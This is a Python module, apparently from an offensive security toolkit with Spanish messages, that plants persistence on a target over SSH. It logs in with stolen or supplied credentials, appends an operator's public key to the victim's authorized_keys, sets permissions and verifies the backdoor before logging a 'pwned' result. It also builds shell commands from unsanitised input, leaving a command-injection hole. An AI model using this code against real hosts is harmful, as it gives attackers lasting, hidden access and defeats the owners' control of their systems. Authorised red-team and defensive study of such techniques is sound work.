# scripts/ssh/post/persistence.py
import os
import paramiko
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db

class Script(BaseScript):
    name        = "persistence"
    protocol    = "ssh"
    category    = "post"
    description = "Añade clave pública SSH a authorized_keys del objetivo para persistencia de acceso."

    EXAMPLES = [
        {"flag": "--pub-key", "desc": "Clave pública a añadir (ruta o contenido)",
         "good": "ssh --script=persistence -t 10.10.10.5 -u root -p Pass! --pub-key /root/.ssh/id_rsa.pub",
         "bad":  "ssh --script=persistence -t 10.10.10.5 -u root (sin --pub-key)"},
    ]

    def run(self, **kwargs):
        port        = int(kwargs.get("port") or 22)
        timeout     = int(kwargs.get("timeout") or self.target.timeout or 5)
        pub_key     = kwargs.get("pub_key")
        target_user = kwargs.get("target_user") or self.creds.user
        ip          = self.target.ip

        if not pub_key:
            console.print("[red]Falta --pub-key.[/red]"); return False

        if os.path.isfile(os.path.expanduser(pub_key)):
            with open(os.path.expanduser(pub_key)) as f:
                pub_key_content = f.read().strip()
        else:
            pub_key_content = pub_key.strip()

        if not pub_key_content.startswith("ssh-"):
            console.print("[red]No parece una clave pública SSH válida.[/red]"); return False

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=self.creds.user,
                           password=self.creds.password or "",
                           timeout=timeout, allow_agent=False, look_for_keys=False)
        except Exception as e:
            print_result("SSH", ip, "fail", f"no se pudo autenticar: {e}"); return False

        _, stdout, _ = client.exec_command(f"getent passwd {target_user} | cut -d: -f6")
        home = stdout.read().decode().strip() or f"/home/{target_user}"
        auth_keys_path = f"{home}/.ssh/authorized_keys"

        for cmd in [
            f"mkdir -p {home}/.ssh",
            f"chmod 700 {home}/.ssh",
            f"echo '{pub_key_content}' >> {auth_keys_path}",
            f"chmod 600 {auth_keys_path}",
            f"chown -R {target_user}:{target_user} {home}/.ssh 2>/dev/null || true",
        ]:
            _, stdout, stderr = client.exec_command(cmd)
            stdout.read(); stderr.read()

        _, stdout, _ = client.exec_command(
            f"grep -c '{pub_key_content[:20]}' {auth_keys_path} 2>/dev/null"
        )
        count = stdout.read().decode().strip()
        client.close()

        if count and int(count) > 0:
            print_result("SSH", ip, "pwned",
                         f"Persistencia establecida en {auth_keys_path} (usuario: {target_user})")
            session_db.save_finding(ip, "SSH", "persistence_established",
                                    f"user={target_user} path={auth_keys_path}")
            return True
        else:
            print_result("SSH", ip, "fail", "No se pudo verificar la persistencia")
            return False
